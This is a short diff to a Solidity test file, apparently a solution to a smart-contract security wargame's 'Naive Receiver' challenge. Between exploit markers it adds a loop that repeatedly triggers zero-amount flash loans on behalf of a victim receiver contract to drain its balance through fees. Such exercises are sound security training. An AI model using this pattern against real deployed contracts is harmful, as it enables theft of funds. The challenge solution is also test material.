@@ -48,7 +48,10 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
-
+         uint receiverAmount = address(flashLoanReceiver).balance / 1 ether;
+         for (uint i = 0; i != receiverAmount; i++) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+         }
         /**
          * EXPLOIT END *
          */
